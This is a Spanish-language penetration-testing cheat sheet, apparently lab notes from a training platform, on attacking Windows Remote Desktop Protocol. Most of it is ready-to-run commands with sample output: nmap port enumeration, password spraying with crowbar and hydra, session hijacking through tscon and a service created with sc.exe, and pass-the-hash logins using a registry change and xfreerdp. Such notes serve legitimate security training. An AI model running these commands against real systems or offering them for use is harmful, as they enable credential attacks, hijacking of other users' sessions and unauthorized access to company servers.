# RDP - Remote Desktop Protocol

Remote Desktop Protocol (RDP) es un protocolo que proporciona al usuario una interfaz gráfica para conectarse a otro ordenador. Es un protocolo muy popular en empresas para poder conectarse a servidores o a equipos y su mala configuración provoca un gran riesgo a nivel empresarial.

* De forma predeterminada RDP utiliza el puerto 3389.



## Enumeración

### Enumeración con nmap

```bash
pyrhos@htb[/htb]# nmap -Pn -p3389 192.168.2.143 

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server

```

### Acceder al Sistema a traves de RDP

#### Acceder con rdesktop

```bash
pyrhos@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143
```

#### Acceder con xfreerdp

```bash
xfreerdp /v:192.168.2.143 /u:admin /p:password123
```

## Ataques

### Password Spraying

Se trata de probar una sola contraseña para una lista de usuario.

#### Lista de usuarios

```bash
pyrhos@htb[/htb]# cat usernames.txt 

root
test
user
guest
admin
administrator
```

#### Password spraying con crowdbar

```bash
pyrhos@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

#### Password spraying con hydra

```bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

### RDP session hijacking

> Para este ataque necesitamos tener privilegios de SYSTEM y poder usar `tscon.exe` .

**Ver ID de las sesiones**

```cmd
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
```

**Redirigir la sesion objetivo a nuestra terminal**

```cmd
C:\htb> tscon 2 /dest:rdp-tcp#13
```

**Elevar permisos a SYSTEM**

Creando un servicio que ejecute una terminal con el siguiente comando para escalar los privilegios a SYSTEM.

```cmd
C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

**Ejecutar el ataque**

```cmd
net start sessionhijack
```

### Pass The hash

#### RDP con Restricted Admin Mode <a href="#rdp-con-restricted-admin-mode" id="rdp-con-restricted-admin-mode"></a>

Por defecto RDP con NLA requiere contraseña en texto claro. Con **Restricted Admin Mode** activo en el destino, se puede conectar usando solo el hash.

```cmd
# Habilitar Restricted Admin Mode en el objetivo (requiere acceso previo)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```cmd
# Conectar via RDP con xfreerdp usando hash
xfreerdp /v:192.168.1.20 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /d:EMPRESA
```

Si Restricted Admin Mode no está habilitado, xfreerdp devuelve un error de restricción de cuenta.

## Misconfiguraciones

| **Contraseñas débiles** | El protocolo RDP utiliza las credenciales del usuario, si la contraseña es debil un ataque por fuerza bruta podria permitir el acceso al atacante |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
